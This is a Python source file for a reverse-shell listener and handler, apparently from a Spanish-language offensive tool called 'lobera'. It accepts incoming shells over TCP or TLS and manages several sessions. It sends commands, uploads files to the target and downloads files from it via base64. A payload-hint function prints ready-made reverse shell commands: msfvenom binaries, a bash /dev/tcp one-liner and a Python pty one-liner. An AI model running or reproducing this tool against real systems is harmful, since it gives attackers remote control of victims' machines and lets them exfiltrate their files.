# scripts/listener/handler.py
"""
Listener/Handler integrado — recibe reverse shells TCP/HTTP/HTTPS.

Uso:
  python lobera.py listen -p 4444                        # raw TCP
  python lobera.py listen -p 4444 --type http            # HTTP reverse shell
  python lobera.py listen -p 443  --type https --cert lobera.pem
  python lobera.py listen -p 4444 --log shells.log       # guarda sesiones
  python lobera.py listen -p 4444 --multi                # acepta múltiples conexiones

Cuando hay conexión activa:
  background   — manda al fondo (multi mode)
  sessions     — lista sesiones activas
  session 1    — interactúa con sesión 1
  upload FILE  — sube archivo al objetivo
  download FILE — descarga archivo del objetivo
"""

import os
import ssl
import socket
import select
import threading
import sys
import time
from pathlib import Path
from datetime import datetime

from core.output import console


class Session:
    def __init__(self, sid, conn, addr):
        self.id       = sid
        self.conn     = conn
        self.addr     = addr
        self.active   = True
        self.connected_at = datetime.now().strftime("%H:%M:%S")
        self.history  = []

    def send(self, data: bytes):
        self.conn.sendall(data)

    def recv(self, size=4096, timeout=0.5) -> bytes:
        self.conn.settimeout(timeout)
        try:
            return self.conn.recv(size)
        except socket.timeout:
            return b''
        except Exception:
            self.active = False
            return b''

    def close(self):
        self.active = False
        try: self.conn.close()
        except Exception: pass


class Handler:
    def __init__(self, port, listen_type='tcp', certfile=None, multi=False, log_file=None):
        self.port        = port
        self.listen_type = listen_type
        self.certfile    = certfile
        self.multi       = multi
        self.log_file    = log_file
        self.sessions    = {}
        self._sid_counter = 0
        self._lock       = threading.Lock()

    def _new_session(self, conn, addr) -> Session:
        with self._lock:
            self._sid_counter += 1
            s = Session(self._sid_counter, conn, addr)
            self.sessions[self._sid_counter] = s
        return s

    def _log(self, line: str):
        if self.log_file:
            with open(self.log_file, 'a') as f:
                f.write(f"[{datetime.now().isoformat()}] {line}\n")

    def start(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', self.port))
        srv.listen(5)

        if self.listen_type == 'https' and self.certfile:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(self.certfile)
            srv = ctx.wrap_socket(srv, server_side=True)

        console.print(f"  [bold green]Escuchando[/bold green] en 0.0.0.0:{self.port} [{self.listen_type.upper()}]")
        console.print(f"  Ctrl+C para salir  |  Genera payload:")
        self._print_payload_hint()

        try:
            if self.multi:
                self._multi_loop(srv)
            else:
                self._single_loop(srv)
        except KeyboardInterrupt:
            console.print("\n  [yellow]Listener cerrado.[/yellow]")
        finally:
            srv.close()

    def _print_payload_hint(self):
        import subprocess, shutil
        lhost = self._get_local_ip()
        console.print(f"\n  [dim]msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={self.port} -f exe -o shell.exe[/dim]")
        console.print(f"  [dim]msfvenom -p linux/x64/shell_reverse_tcp   LHOST={lhost} LPORT={self.port} -f elf -o shell[/dim]")
        console.print(f"  [dim]bash -i >& /dev/tcp/{lhost}/{self.port} 0>&1[/dim]")
        console.print(f"  [dim]python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('{lhost}',{self.port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn('/bin/bash')\"[/dim]\n")

    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '0.0.0.0'

    def _single_loop(self, srv):
        console.print("  Esperando conexión...\n")
        conn, addr = srv.accept()
        session = self._new_session(conn, addr)
        console.print(f"  [bold green]¡Conexión![/bold green] {addr[0]}:{addr[1]}  (sesión #{session.id})")
        self._log(f"CONNECT {addr[0]}:{addr[1]}")
        self._interactive(session)

    def _multi_loop(self, srv):
        console.print("  Modo multi — esperando conexiones (escribe 'sessions' para listar)\n")
        srv.settimeout(1)

        def accept_loop():
            while True:
                try:
                    conn, addr = srv.accept()
                    session = self._new_session(conn, addr)
                    console.print(f"\n  [bold green]Nueva sesión #{session.id}[/bold green] — {addr[0]}:{addr[1]}")
                    self._log(f"CONNECT {addr[0]}:{addr[1]} session={session.id}")
                except socket.timeout:
                    continue
                except Exception:
                    break

        t = threading.Thread(target=accept_loop, daemon=True)
        t.start()

        # CLI de sesiones
        while True:
            try:
                cmd = input("lobera-handler> ").strip()
            except (EOFError, KeyboardInterrupt):
                break

            if not cmd:
                continue
            elif cmd == 'sessions':
                self._list_sessions()
            elif cmd.startswith('session '):
                try:
                    sid = int(cmd.split()[1])
                    if sid in self.sessions and self.sessions[sid].active:
                        self._interactive(self.sessions[sid])
                    else:
                        print(f"Sesión {sid} no existe o está cerrada.")
                except (ValueError, IndexError):
                    print("Uso: session <ID>")
            elif cmd in ('exit', 'quit'):
                break
            else:
                print("Comandos: sessions | session <ID> | exit")

    def _list_sessions(self):
        active = {sid: s for sid, s in self.sessions.items() if s.active}
        if not active:
            print("  Sin sesiones activas.")
            return
        print(f"  {'ID':<4} {'IP':<18} {'Hora':<10}")
        print(f"  {'-'*4} {'-'*18} {'-'*10}")
        for sid, s in active.items():
            print(f"  {sid:<4} {s.addr[0]:<18} {s.connected_at}")

    def _interactive(self, session: Session):
        console.print(f"  [bold]Sesión #{session.id}[/bold] — {session.addr[0]}  (escribe 'background' para volver)")
        console.print("  [dim]upload FILE | download FILE | background | exit[/dim]\n")

        # Leer banner inicial
        banner = session.recv(timeout=1.0)
        if banner:
            sys.stdout.write(banner.decode('utf-8', errors='replace'))
            sys.stdout.flush()

        while session.active:
            try:
                rlist, _, _ = select.select([sys.stdin, session.conn], [], [], 0.1)
            except Exception:
                break

            if sys.stdin in rlist:
                try:
                    line = sys.stdin.readline()
                except Exception:
                    break
                if not line:
                    break

                cmd = line.strip()

                if cmd == 'background':
                    console.print("  [yellow]Sesión en segundo plano.[/yellow]")
                    return
                elif cmd == 'exit':
                    session.send(b'exit\n')
                    session.close()
                    return
                elif cmd.startswith('upload '):
                    self._upload(session, cmd[7:].strip())
                    continue
                elif cmd.startswith('download '):
                    self._download(session, cmd[9:].strip())
                    continue
                else:
                    session.send((cmd + '\n').encode())
                    self._log(f"CMD [{session.addr[0]}] {cmd}")

            if session.conn in rlist:
                data = session.recv(timeout=0.1)
                if data:
                    sys.stdout.write(data.decode('utf-8', errors='replace'))
                    sys.stdout.flush()
                    self._log(f"OUT [{session.addr[0]}] {data[:200]}")
                else:
                    console.print(f"\n  [red]Sesión #{session.id} cerrada.[/red]")
                    session.close()
                    return

    def _upload(self, session: Session, local_path: str):
        if not Path(local_path).exists():
            console.print(f"  [red]Archivo no encontrado: {local_path}[/red]")
            return
        data = Path(local_path).read_bytes()
        fname = Path(local_path).name
        # Enviar como base64 y decodificar en el objetivo
        import base64
        b64 = base64.b64encode(data).decode()
        cmd = f'echo {b64} | base64 -d > /tmp/{fname}\n'
        session.send(cmd.encode())
        console.print(f"  [green]✓ Upload enviado: {fname} ({len(data)} bytes)[/green]")

    def _download(self, session: Session, remote_path: str):
        fname = Path(remote_path).name
        cmd = f'base64 {remote_path}\n'
        session.send(cmd.encode())
        time.sleep(1)
        data = session.recv(timeout=3.0)
        if data:
            import base64
            try:
                raw = base64.b64decode(data.decode().strip())
                out = Path(fname)
                out.write_bytes(raw)
                console.print(f"  [green]✓ Descargado: {fname} ({len(raw)} bytes)[/green]")
            except Exception as e:
                console.print(f"  [red]Error decodificando: {e}[/red]")


class Script:
    NAME        = "handler"
    DESCRIPTION = "Listener/Handler integrado para reverse shells TCP/HTTP/HTTPS"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        port       = getattr(args, 'port',    4444)
        ltype      = getattr(args, 'type',    'tcp')
        certfile   = getattr(args, 'cert',    None)
        multi      = getattr(args, 'multi',   False)
        log_file   = getattr(args, 'log',     None)

        h = Handler(port, ltype, certfile, multi, log_file)
        h.start()
